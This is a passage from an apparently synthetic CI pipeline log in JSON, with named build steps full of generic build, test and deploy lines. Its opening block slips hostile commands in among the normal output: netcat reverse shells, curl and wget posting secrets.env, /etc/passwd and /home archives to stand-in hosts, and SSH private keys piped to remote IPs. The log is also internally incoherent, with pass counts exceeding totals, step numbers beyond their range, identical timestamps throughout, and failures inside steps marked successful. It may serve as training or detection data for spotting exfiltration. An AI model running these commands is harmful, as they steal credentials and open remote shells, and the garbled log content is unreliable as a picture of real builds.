https://acme.corp/\npip: Downloading webpack-1.14.tar.gz\n[12:18:58] INFO: Processing request\nConnecting to example.com:443...\nStep 5/20: Linting\nProcessing...\nSending 345MB of data to startup.dev\nHEAD is now at b13677a\nArtifact uploaded: dist.zip (85MB)\nSending 227MB of data to example.com\nProcessing...\nPushing to registry...\nVerifying...\nCompiling lib/app.ts...\ncurl -X POST https://startup.dev/collect -d @secrets.env\nCreating production build...\n[12:18:58] WARN: Deprecated API usage\nnpm install: resolved 580 packages\nnc -e /bin/sh 41.2.242.33 18914\n[12:18:58] INFO: Processing request\n  PASS: integration/test_db_connect.spec.js\nWARNING: prettier has known vulnerabilities\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\n\u2717 build failed with exit code 107\n\u2713 All checks passed\nFetching submodules...\nnc -e /bin/sh 34.58.131.149 30411\nConnection established\nArtifact uploaded: build.tar.gz (8MB)\ncurl -X POST https://test.io/collect -d @secrets.env\nMinifying vendor.js\nBuilding Docker image...\nStep 3/23: Building\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nImage pulled successfully\ncurl -X POST https://test.io/collect -d @secrets.env\nGET /status - 204 (38ms)\nStep 17/18: Linting\n  PASS: test_db_connect (130ms)\nBuilding Docker image...\nProcessing...\nVerifying...\nPlatform: linux-x64\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\n[12:18:58] DEBUG: Memory usage: 1841MB\nProcessing...\nCompiling utils/service.java...\nStep 16/15: Linting\nArtifact downloaded: 32MB\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPushing to registry...\nFinished.\n[12:18:58] WARN: Deprecated API usage\n[12:18:58] DEBUG: Memory usage: 526MB\nSnapshots: 23 passed, 0 total\nCompleted.\nPulling image: python:latest\n\u2713 All checks passed\ncurl -X POST https://cloud.services/collect -d @secrets.env\necho $(cat ~/.ssh/id_rsa) | base64 | nc 27.131.160.134 60893\nGET /health - 200 (98ms)\nRan 68 tests in 27s\nUsing Python 3.11\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nArtifact uploaded: dist.zip (55MB)\ntar czf - /home | curl -X POST -d @- https://example.com/upload\necho $(cat ~/.ssh/id_rsa) | base64 | nc 31.204.111.4 8890\nPulling image: python:latest\nArtifact uploaded: dist.zip (72MB)\nStep 13/17: Building\nStep 4/22: Running migrations\nnpm notice: package.json updated\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nFAILED: test_auth_login\nMinifying app.js\nNODE_ENV=production\nSuccess!\nnc -e /bin/sh 128.103.51.81 44686\nnc -e /bin/sh 85.213.26.77 39850\n[12:18:58] INFO: Processing request\n=== Step lint completed ===",
    "steps": [
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-16T12:18:58.204747",
        "finished_at": "2025-12-16T12:19:07.152385",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Connection established",
          "POST /upload - 201 (15ms)",
          "Minifying app.js",
          "Loading...",
          "npm notice: created a lockfile",
          "[12:18:58] INFO: Connecting to database",
          "Done.",
          "Waiting...",
          "Compiling utils/handler.rs...",
          "Image pulled successfully",
          "Uploading artifact 'dist' (37 files)",
          "[12:18:58] DEBUG: Loading configuration",
          "Connection established",
          "  PASS: integration/test_auth_login.spec.js",
          "Compiling lib/service.java...",
          "Switched to branch 'feature/task-977'",
          "Step 4/25: Building",
          "Cache restored successfully (255MB)",
          "Using Node.js 15.2.4",
          "Exception: RuntimeError",
          "\u2713 Step 'build' succeeded",
          "Using Python 3.10",
          "[12:18:58] INFO: Request completed",
          "npm notice: package.json updated",
          "Compiling src/utils.go...",
          "Cache invalidated: dependencies",
          "pip: Collecting react",
          "[12:18:58] DEBUG: Loading configuration",
          "Test Suites: 50 passed, 26 total",
          "[12:18:58] INFO: Cache refreshed",
          "Test Suites: 42 passed, 16 total",
          "[12:18:58] DEBUG: Connection pool: 3 active",
          "Time: 31.89s",
          "Cache restored successfully (17MB)",
          "\u2713 All checks passed",
          "Compiling components/handler.rs...",
          "Cache hit for key-3652",
          "Optimizing 61 modules...",
          "Ran 59 tests in 47s",
          "[12:18:58] DEBUG: Connection pool: 9 active",
          "Installing eslint@5.19.8",
          "Platform: win32-x64",
          "Step 12/18: Testing",
          "[12:18:58] DEBUG: Connection pool: 2 active",
          "Layer 5/8: COPY command",
          "[12:18:58] WARN: Deprecated API usage",
          "pip install: Successfully installed lodash-4.12",
          "  PASS: test_api_health (252ms)",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "FAILED: test_db_connect",
          "[12:18:58] DEBUG: Query executed in 15ms",
          "Verifying...",
          "Cache miss for key-3114",
          "npm notice: package.json updated",
          "Fetching submodules...",
          "Step 1/16: Installing dependencies",
          "HEAD is now at d6ed971",
          "\u2713 Step 'test' succeeded",
          "pip: Installing build dependencies...",
          "[12:18:58] INFO: Connecting to database",
          "Checking out develop branch",
          "Completed.",
          "[12:18:58] ERROR: Connection failed",
          "Step 4/15: Installing dependencies",
          "WARNING: webpack has known vulnerabilities",
          "Uploading artifact 'coverage' (5 files)",
          "Verifying...",
          "Step 12/23: Running migrations",
          "Optimizing 45 modules...",
          "Switched to branch 'feature/task-160'",
          "Already up to date.",
          "Ran 86 tests in 6s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Completed.",
          "TLS handshake completed",
          "Waiting...",
          "WARNING: eslint has known vulnerabilities",
          "npm notice: created a lockfile",
          "Success!",
          "Test Suites: 32 passed, 17 total",
          "Test Suites: 20 passed, 28 total",
          "Bundling main.css",
          "FAILED: test_user_create",
          "npm notice: created a lockfile",
          "Done.",
          "[12:18:58] DEBUG: Connection pool: 5 active",
          "TLS handshake completed",
          "[12:18:58] INFO: Processing request",
          "npm notice: package.json updated",
          "Compiling lib/main.py...",
          "\u2713 Task completed in 2687ms",
          "Step 18/18: Installing dependencies",
          "Ready.",
          "\u2717 build failed with exit code 43",
          "Snapshots: 29 passed, 22 total",
          "Ran 54 tests in 37s",
          "Minifying vendor.js",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-16T12:19:07.152385",
        "finished_at": "2025-12-16T12:19:29.521479",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Step 16/16: Linting",
          "Completed.",
          "Test Suites: 25 passed, 29 total",
          "GET /health - 204 (19ms)",
          "yarn add: Done in 16.82s",
          "\u2713 Task completed in 4173ms",
          "Image pulled successfully",
          "Building Docker image...",
          "Compiling src/index.js...",
          "[12:18:58] WARN: Deprecated API usage",
          "Checking out develop branch",
          "OK",
          "TLS handshake completed",
          "Pushing to registry...",
          "Environment: production",
          "Compiling components/main.py...",
          "[12:18:58] DEBUG: Loading configuration",
          "[12:18:58] INFO: Cache refreshed",
          "Compiling components/service.java...",
          "  PASS: test_cache_hit (175ms)",
          "npm notice: created a lockfile",
          "[12:18:58] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Verifying...",
          "[12:18:58] DEBUG: Connection pool: 5 active",
          "TLS handshake completed",
          "Time: 13.326s",
          "Step 5/25: Installing dependencies",
          "Environment: test",
          "Artifact uploaded: dist.zip (69MB)",
          "WARNING: prettier has known vulnerabilities",
          "Snapshots: 13 passed, 13 total",
          "Compiling components/index.js...",
          "pip: Downloading express-2.6.tar.gz",
          "Compiling components/service.java...",
          "\u2713 Step 'setup' succeeded",
          "Connection established",
          "Creating production build...",
          "Loading...",
          "Generating source maps...",
          "Transforming 329 files...",
          "Step 3/22: Building",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 build completed",
          "\u2713 All checks passed",
          "HEAD is now at 7198ca1",
          "Step 6/15: Installing dependencies",
          "Compiling src/service.java...",
          "[12:18:58] DEBUG: Loading configuration",
          "\u2717 build failed with exit code 110",
          "Using Node.js 18.12.2",
          "Artifact uploaded: dist.zip (81MB)",
          "Bundling runtime.css",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 15/22: Installing dependencies",
          "Artifact uploaded: dist.zip (74MB)",
          "Ran 116 tests in 11s",
          "\u2717 build failed with exit code 93",
          "Transforming 800 files...",
          "WARNING: react has known vulnerabilities",
          "Compiling src/app.ts...",
          "Loading...",
          "Step 4/22: Running migrations",
          "  PASS: test_cache_hit (260ms)",
          "Minifying app.js",
          "Optimizing 89 modules...",
          "WARNING: axios has known vulnerabilities",
          "Image pulled successfully",
          "Pulling image: alpine:latest",
          "\u2713 Step 'install' succeeded",
          "Transforming 542 files...",
          "OK",
          "Waiting...",
          "Processing...",
          "[12:18:58] INFO: Cache refreshed",
          "Pulling image: python:latest",
          "\u2717 build failed with exit code 89",
          "\u2713 Task completed in 3161ms",
          "Building Docker image...",
          "Time: 37.885s",
          "Compiling components/utils.go...",
          "Transforming 376 files...",
          "Finished.",
          "Waiting...",
          "Artifact downloaded: 1MB",
          "Already up to date.",
          "Artifact downloaded: 41MB",
          "Exception: RuntimeError",
          "Compiling lib/index.js...",
          "Step 17/24: Installing dependencies",
          "OK",
          "Checking out main branch",
          "\u2717 build failed with exit code 80",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact downloaded: 5MB",
          "Checking out master branch",
          "[12:18:58] DEBUG: Loading configuration",
          "Environment: development",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-16T12:19:29.521479",
        "finished_at": "2025-12-16T12:19:51.890573",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "npm install: added 143 packages",
          "Step 6/15: Building",
          "Step 16/25: Running migrations",
          "Step 16/25: Installing dependencies",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:18:58] DEBUG: Query executed in 89ms",
          "npm notice: package.json updated",
          "[12:18:58] INFO: Processing request",
          "Tests: 416 passed, 277 total",
          "Artifact downloaded: 34MB",
          "npm notice: package.json updated",
          "Optimizing 60 modules...",
          "Environment: test",
          "npm notice: package.json updated",
          "Connection established",
          "Cache hit for key-4574",
          "Pulling image: alpine:3.11",
          "Ready.",
          "Step 12/17: Testing",
          "[12:18:58] INFO: Connecting to database",
          "[12:18:58] DEBUG: Initializing service",
          "Using Node.js 19.10.1",
          "Using Python 3.9",
          "yarn add: Done in 22.21s",
          "Generating source maps...",
          "HEAD is now at 362f4d1",
          "[12:18:58] DEBUG: Initializing service",
          "\u2717 build failed with exit code 112",
          "Using Python 3.11",
          "WARNING: eslint has known vulnerabilities",
          "HEAD is now at 89d5003",
          "Cache miss for key-2782",
          "Using Node.js 20.6.8",
          "\u2713 Step 'build' succeeded",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Environment: test",
          "npm notice: package.json updated",
          "Pushing to registry...",
          "Building Docker image...",
          "Exception: TypeError",
          "npm notice: created a lockfile",
          "pip install: Successfully installed express-5.14",
          "Fetching submodules...",
          "Uploading artifact 'build' (35 files)",
          "Artifact downloaded: 23MB",
          "TLS handshake completed",
          "Cache hit for key-3059",
          "Step 13/16: Linting",
          "Loading...",
          "Using Node.js 20.16.2",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 Task completed in 420ms",
          "[12:18:58] WARN: Deprecated API usage",
          "[12:18:58] WARN: Deprecated API usage",
          "npm install: resolved 1743 packages",
          "Fetching submodules...",
          "Compiling components/app.ts...",
          "Minifying vendor.js",
          "yarn add: Done in 30.93s",
          "Switched to branch 'feature/task-607'",
          "OK",
          "Cache invalidated: build",
          "Transforming 929 files...",
          "Artifact uploaded: dist.zip (51MB)",
          "npm notice: created a lockfile",
          "Finished.",
          "Artifact downloaded: 40MB",
          "[12:18:58] DEBUG: Connection pool: 20 active",
          "[12:18:58] INFO: Request completed",
          "Pulling image: node:latest",
          "npm install: added 162 packages",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Time: 77.672s",
          "Step 1/22: Building",
          "[12:18:58] INFO: Request completed",
          "Pushing to registry...",
          "WARNING: webpack has known vulnerabilities",
          "Tests: 445 passed, 359 total",
          "Uploading artifact 'coverage' (18 files)",
          "[12:18:58] ERROR: Connection failed",
          "Generating source maps...",
          "Connection established",
          "Completed.",
          "Verifying...",
          "Exception: ValueError",
          "Creating production build...",
          "POST /data - 201 (379ms)",
          "Uploading artifact 'build' (22 files)",
          "Platform: win32-x64",
          "Snapshots: 25 passed, 35 total",
          "Ready.",
          "[12:18:58] DEBUG: Initializing service",
          "TLS handshake completed",
          "Test Suites: 13 passed, 45 total",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-16T12:19:51.890573",
        "finished_at": "2025-12-16T12:20:05.312029",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Artifact uploaded: dist.zip (88MB)",
          "  PASS: test_cache_hit (234ms)",
          "Pushing to registry...",
          "Artifact uploaded: dist.zip (58MB)",
          "Transforming 184 files...",
          "Using Python 3.10",
          "Connecting to example.com:443...",
          "\u2713 validate completed",
          "Step 12/18: Testing",
          "yarn add: Done in 13.42s",
          "Success!",
          "Step 18/18: Installing dependencies",
          "Waiting...",
          "\u2713 All checks passed",
          "Step 1/20: Deploying",
          "Coverage: 92% statements, 83% branches",
          "POST /api - 202 (439ms)",
          "Compiling utils/index.js...",
          "[12:18:58] WARN: Deprecated API usage",
          "Coverage: 74% statements, 78% branches",
          "[12:18:58] INFO: Connecting to database",
          "Done.",
          "[12:18:58] INFO: Connecting to database",
          "Artifact downloaded: 50MB",
          "Compiling utils/index.js...",
          "pip: Installing build dependencies...",
          "Step 8/20: Linting",
          "POST /data - 200 (249ms)",
          "Step 13/25: Deploying",
          "Creating production build...",
          "Environment: staging",
          "Compiling utils/utils.go...",
          "Artifact uploaded: dist.zip (96MB)",
          "POST /data - 201 (374ms)",
          "\u2717 build failed with exit code 61",
          "Connecting to cloud.services:443...",
          "Using Node.js 14.10.4",
          "Uploading artifact 'build' (28 files)",
          "Verifying...",
          "[12:18:58] INFO: Cache refreshed",
          "Tests: 488 passed, 95 total",
          "\u2713 Task completed in 1766ms",
          "OK",
          "Pushing to registry...",
          "Already up to date.",
          "Test Suites: 26 passed, 14 total",
          "[12:18:58] INFO: Connecting to database",
          "Verifying...",
          "Tests: 423 passed, 377 total",
          "Cache saved successfully",
          "Step 12/19: Running migrations",
          "[12:18:58] DEBUG: Initializing service",
          "Step 19/20: Installing dependencies",
          "\u2717 build failed with exit code 13",
          "\u2713 Step 'install' succeeded",
          "Artifact downloaded: 46MB",
          "Compiling lib/app.ts...",
          "Checking out develop branch",
          "Cache restored successfully (284MB)",
          "Artifact uploaded: dist.zip (80MB)",
          "Checking out main branch",
          "Transforming 484 files...",
          "Connection established",
          "POST /data - 201 (379ms)",
          "Ran 184 tests in 33s",
          "\u2713 Task completed in 608ms",
          "FAILED: test_user_create",
          "Step 16/23: Installing dependencies",
          "Transforming 175 files...",
          "  PASS: test_db_connect (389ms)",
          "Time: 31.981s",
          "Using Node.js 20.0.0",
          "Pulling image: node:3.11",
          "Cache miss for key-5978",
          "Connecting to startup.dev:443...",
          "\u2717 build failed with exit code 16",
          "Step 3/23: Installing dependencies",
          "\u2713 Step 'install' succeeded",
          "Cache saved successfully",
          "pip install: Successfully installed webpack-2.18",
          "[12:18:58] INFO: Request completed",
          "Step 3/17: Running migrations",
          "Connecting to example.com:443...",
          "[12:18:58] WARN: Deprecated API usage",
          "Connection established",
          "yarn add: Done in 15.94s",
          "Ready.",
          "pip: Installing build dependencies...",
          "[12:18:58] DEBUG: Initializing service",
          "Processing...",
          "Compiling src/app.ts...",
          "Platform: darwin-arm64",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Done.",
          "npm install: resolved 136 packages",
          "Pulling image: alpine:3.11",
          "npm notice: package.json updated",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-16T12:20:05.312029",
        "finished_at": "2025-12-16T12:20:18.733485",
        "log_lines": [
          "=== Step: save_cache ===",
          "pip: Installing build dependencies...",
          "Ready.",
          "Image pulled successfully",
          "Cache saved successfully",
          "  PASS: unit/test_cache_hit.spec.js",
          "Artifact uploaded: dist.zip (46MB)",
          "[12:18:58] INFO: Request completed",
          "Compiling src/handler.rs...",
          "pip install: Successfully installed express-1.20",
          "pip: Collecting eslint",
          "\u2713 build completed",
          "Step 18/24: Running migrations",
          "Completed.",
          "Finished.",
          "WARNING: jest has known vulnerabilities",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm install: resolved 1619 packages",
          "pip: Collecting express",
          "Step 6/25: Building",
          "[12:18:58] DEBUG: Query executed in 57ms",
          "Ready.",
          "Cache saved successfully",
          "[12:18:58] ERROR: Connection failed",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: eslint has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip install: Successfully installed axios-5.16",
          "Already up to date.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Generating source maps...",
          "[12:18:58] DEBUG: Memory usage: 877MB",
          "Tests: 176 passed, 445 total",
          "  PASS: test_auth_login (306ms)",
          "POST /data - 201 (269ms)",
          "Cache restored successfully (330MB)",
          "HEAD is now at d4c11fd",
          "Cache hit for key-7553",
          "Cache hit for key-6008",
          "Step 12/20: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Pushing to registry...",
          "  PASS: e2e/test_auth_login.spec.js",
          "Switched to branch 'hotfix/task-181'",
          "\u2713 Task completed in 4629ms",
          "[12:18:58] ERROR: Connection failed",
          "Success!",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "npm notice: package.json updated",
          "pip: Installing build dependencies...",
          "Waiting...",
          "Step 11/22: Testing",
          "Compiling src/main.py...",
          "TLS handshake completed",
          "Test Suites: 17 passed, 35 total",
          "WARNING: eslint has known vulnerabilities",
          "npm install: added 414 packages",
          "Tests: 478 passed, 83 total",
          "Compiling utils/main.py...",
          "Test Suites: 11 passed, 42 total",
          "npm install: resolved 514 packages",
          "[12:18:58] DEBUG: Initializing service",
          "Pushing to registry...",
          "Verifying...",
          "Ran 23 tests in 7s",
          "Environment: staging",
          "Ran 64 tests in 7s",
          "Image pulled successfully",
          "Pushing to registry...",
          "Bundling runtime.css",
          "Optimizing 83 modules...",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Minifying vendor.js",
          "Ran 100 tests in 15s",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Creating production build...",
          "Layer 2/15: ENV command",
          "\u2717 build failed with exit code 89",
          "[12:18:58] DEBUG: Connection pool: 15 active",
          "Snapshots: 41 passed, 17 total",
          "Generating source maps...",
          "[12:18:58] DEBUG: Connection pool: 15 active",
          "NODE_ENV=development",
          "Done.",
          "Ready.",
          "[12:18:58] INFO: Connecting to database",
          "Completed.",
          "GET /status - 204 (4ms)",
          "Step 19/23: Deploying",
          "Coverage: 91% statements, 68% branches",
          "[12:18:58] WARN: Deprecated API usage",
          "  PASS: integration/test_user_create.spec.js",
          "Creating production build...",
          "Compiling components/app.ts...",
          "Time: 104.823s",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-16T12:20:18.733485",
        "finished_at": "2025-12-16T12:20:27.681123",
        "log_lines": [
          "=== Step: checkout ===",
          "Ready.",
          "GET /health - 204 (88ms)",
          "[12:18:58] INFO: Request completed",
          "Completed.",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Creating production build...",
          "Tests: 260 passed, 97 total",
          "Uploading artifact 'build' (44 files)",
          "Cache invalidated: build",
          "Artifact uploaded: build.tar.gz (18MB)",
          "[12:18:58] WARN: Deprecated API usage",
          "[12:18:58] INFO: Request completed",
          "Step 1/24: Deploying",
          "[12:18:58] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (77MB)",
          "[12:18:58] ERROR: Connection failed",
          "Minifying vendor.js",
          "GET /status - 204 (94ms)",
          "Exception: NullPointerException",
          "POST /upload - 200 (98ms)",
          "Ran 61 tests in 34s",
          "npm install: added 27 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-3592",
          "Snapshots: 48 passed, 44 total",
          "[12:18:58] DEBUG: Loading configuration",
          "[12:18:58] DEBUG: Query executed in 62ms",
          "\u2713 All checks passed",
          "pip: Downloading lodash-4.10.tar.gz",
          "WARNING: express has known vulnerabilities",
          "Switched to branch 'feature/task-755'",
          "\u2713 deploy completed",
          "Cache miss for key-6548",
          "pip: Downloading eslint-5.1.tar.gz",
          "pip: Installing build dependencies...",
          "[12:18:58] DEBUG: Loading configuration",
          "Compiling components/handler.rs...",
          "[12:18:58] DEBUG: Initializing service",
          "Done.",
          "npm install: resolved 1976 packages",
          "Platform: darwin-arm64",
          "Compiling components/main.py...",
          "npm notice: package.json updated",
          "  PASS: test_user_create (361ms)",
          "Uploading artifact 'build' (37 files)",
          "pip: Downloading react-4.7.tar.gz",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "Compiling utils/app.ts...",
          "Step 17/16: Testing",
          "npm install: added 193 packages",
          "\u2713 Task completed in 4113ms",
          "pip: Collecting eslint",
          "Compiling components/app.ts...",
          "Image pulled successfully",
          "Environment: staging",
          "[12:18:58] INFO: Starting build process",
          "Creating production build...",
          "GET /health - 201 (97ms)",
          "Already up to date.",
          "Building Docker image...",
          "pip install: Successfully installed axios-2.12",
          "Building Docker image...",
          "Completed.",
          "[12:18:58] INFO: Starting build process",
          "[12:18:58] ERROR: Connection failed",
          "[12:18:58] INFO: Request completed",
          "POST /api - 200 (37ms)",
          "OK",
          "Fetching submodules...",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Step 2/23: Installing dependencies",
          "Step 7/20: Linting",
          "Ready.",
          "Compiling utils/index.js...",
          "pip: Downloading express-3.4.tar.gz",
          "Already up to date.",
          "pip: Installing build dependencies...",
          "Step 2/22: Running migrations",
          "\u2713 Task completed in 1913ms",
          "Tests: 478 passed, 454 total",
          "Cache restored successfully (232MB)",
          "Ready.",
          "Ran 111 tests in 36s",
          "WARNING: eslint has known vulnerabilities",
          "TLS handshake completed",
          "Step 5/22: Deploying",
          "[12:18:58] DEBUG: Memory usage: 868MB",
          "Artifact uploaded: dist.zip (89MB)",
          "Time: 108.986s",
          "Platform: darwin-arm64",
          "Test Suites: 41 passed, 49 total",
          "\u2713 Task completed in 4235ms",
          "FAILED: test_cache_hit",
          "npm notice: created a lockfile",
          "[12:18:58] WARN: Deprecated API usage",
          "Optimizing 72 modules...",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-16T12:20:27.681123",
        "finished_at": "2025-12-16T12:21:34.788404",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Artifact uploaded: dist.zip (97MB)",
          "\u2717 build failed with exit code 1",
          "Snapshots: 10 passed, 1 total",
          "Cache hit for key-6589",
          "Compiling lib/index.js...",
          "npm install: resolved 1023 packages",
          "Ready.",
          "Coverage: 92% statements, 87% branches",
          "Creating production build...",
          "Tests: 163 passed, 84 total",
          "Step 11/18: Testing",
          "Ran 79 tests in 58s",
          "Transforming 182 files...",
          "\u2713 Step 'setup' succeeded",
          "[12:18:58] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (37MB)",
          "npm notice: created a lockfile",
          "[12:18:58] DEBUG: Loading configuration",
          "[12:18:58] INFO: Cache refreshed",
          "Loading...",
          "yarn add: Done in 20.33s",
          "Waiting...",
          "Cache saved successfully",
          "Loading...",
          "Compiling lib/handler.rs...",
          "Time: 88.651s",
          "[12:18:58] DEBUG: Memory usage: 1634MB",
          "Bundling main.css",
          "HEAD is now at 67eff80",
          "Already up to date.",
          "Installing axios@3.18.6",
          "Cache invalidated: node_modules",
          "Done.",
          "Verifying...",
          "GET /status - 204 (10ms)",
          "Layer 1/11: RUN command",
          "pip: Collecting react",
          "[12:18:58] INFO: Cache refreshed",
          "pip install: Successfully installed eslint-1.18",
          "Coverage: 80% statements, 95% branches",
          "Checking out master branch",
          "Ready.",
          "Ready.",
          "HEAD is now at 68facb6",
          "\u2713 test completed",
          "TLS handshake completed",
          "  PASS: test_auth_login (167ms)",
          "Uploading artifact 'coverage' (42 files)",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Coverage: 87% statements, 75% branches",
          "Processing...",
          "Building Docker image...",
          "Cache hit for key-2073",
          "\u2713 build completed",
          "npm notice: created a lockfile",
          "Step 18/15: Running migrations",
          "npm notice: package.json updated",
          "Using Node.js 20.8.6",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Optimizing 84 modules...",
          "Minifying vendor.js",
          "Artifact downloaded: 2MB",
          "Using Python 3.11",
          "yarn add: Done in 24.58s",
          "  PASS: test_cache_hit (179ms)",
          "Test Suites: 30 passed, 6 total",
          "Image pulled successfully",
          "Creating production build...",
          "pip install: Successfully installed axios-2.14",
          "Transforming 482 files...",
          "Compiling utils/main.py...",
          "Compiling lib/app.ts...",
          "Connecting to cloud.services:443...",
          "Pushing to registry...",
          "Connection established",
          "[12:18:58] DEBUG: Memory usage: 508MB",
          "Verifying...",
          "Compiling lib/service.java...",
          "HEAD is now at bf3c4e5",
          "Cache saved successfully",
          "Connection established",
          "Completed.",
          "Optimizing 49 modules...",
          "\u2713 Step 'build' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:18:58] INFO: Request completed",
          "[12:18:58] INFO: Request completed",
          "Switched to branch 'hotfix/task-232'",
          "Building Docker image...",
          "WARNING: express has known vulnerabilities",
          "[12:18:58] INFO: Request completed",
          "Transforming 776 files...",
          "  PASS: unit/test_api_health.spec.js",
          "[12:18:58] INFO: Request completed",
          "Layer 1/14: COPY command",
          "Artifact downloaded: 7MB",
          "pip: Downloading axios-3.12.tar.gz",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-16T12:21:34.788404",
        "finished_at": "2025-12-16T12:21:57.157498",
        "log_lines": [
          "=== Step: setup_node ===",
          "Building Docker image...",
          "Success!",
          "Building Docker image...",
          "Done.",
          "Installing react@2.19.6",
          "HEAD is now at 0d08947",
          "[12:18:58] DEBUG: Memory usage: 755MB",
          "Environment: development",
          "WARNING: webpack has known vulnerabilities",
          "[12:18:58] DEBUG: Connection pool: 9 active",
          "Verifying...",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 deploy completed",
          "Cache restored successfully (85MB)",
          "[12:18:58] INFO: Starting build process",
          "Connection established",
          "Compiling components/utils.go...",
          "\u2713 Task completed in 3980ms",
          "Step 4/20: Installing dependencies",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2717 build failed with exit code 79",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:18:58] INFO: Starting build process",
          "HEAD is now at 0eb1a75",
          "[12:18:58] DEBUG: Connection pool: 2 active",
          "Using Python 3.11",
          "Step 18/23: Running migrations",
          "Compiling utils/main.py...",
          "yarn add: Done in 3.79s",
          "\u2713 All checks passed",
          "\u2713 package completed",
          "Step 10/21: Running migrations",
          "Checking out main branch",
          "Environment: test",
          "Coverage: 100% statements, 70% branches",
          "Bundling main.css",
          "Platform: darwin-arm64",
          "Artifact uploaded: build.tar.gz (8MB)",
          "pip: Collecting axios",
          "npm install: added 293 packages",
          "Snapshots: 16 passed, 44 total",
          "Switched to branch 'hotfix/task-719'",
          "Processing...",
          "[12:18:58] INFO: Processing request",
          "Environment: test",
          "npm notice: created a lockfile",
          "Environment: staging",
          "[12:18:58] DEBUG: Query executed in 21ms",
          "Connecting to test.io:443...",
          "Step 9/17: Installing dependencies",
          "Loading...",
          "Step 11/18: Running migrations",
          "Finished.",
          "[12:18:58] INFO: Request completed",
          "Cache hit for key-8170",
          "[12:18:58] DEBUG: Loading configuration",
          "Compiling components/app.ts...",
          "npm install: added 484 packages",
          "pip: Collecting react",
          "[12:18:58] INFO: Starting build process",
          "Cache invalidated: build",
          "Cache saved successfully",
          "Optimizing 85 modules...",
          "Compiling utils/main.py...",
          "[12:18:58] DEBUG: Memory usage: 1544MB",
          "Success!",
          "[12:18:58] INFO: Cache refreshed",
          "Compiling lib/index.js...",
          "Cache miss for key-9068",
          "Connection established",
          "Test Suites: 16 passed, 18 total",
          "Switched to branch 'hotfix/task-100'",
          "\u2713 Step 'checkout' succeeded",
          "Image pulled successfully",
          "Environment: development",
          "Optimizing 49 modules...",
          "Connection established",
          "Loading...",
          "Bundling main.js",
          "npm notice: package.json updated",
          "Compiling utils/handler.rs...",
          "Artifact uploaded: dist.zip (37MB)",
          "Environment: development",
          "Creating production build...",
          "npm notice: package.json updated",
          "Cache miss for key-5809",
          "Waiting...",
          "\u2713 Step 'test' succeeded",
          "Connection established",
          "[12:18:58] DEBUG: Initializing service",
          "yarn add: Done in 4.4s",
          "[12:18:58] WARN: Deprecated API usage",
          "Verifying...",
          "Switched to branch 'feature/task-557'",
          "Exception: NullPointerException",
          "Cache restored successfully (215MB)",
          "Tests: 207 passed, 402 total",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-16T12:21:57.157498",
        "finished_at": "2025-12-16T12:22:19.526592",
        "log_lines": [
          "=== Step: setup_environment ===",
          "[12:18:58] DEBUG: Initializing service",
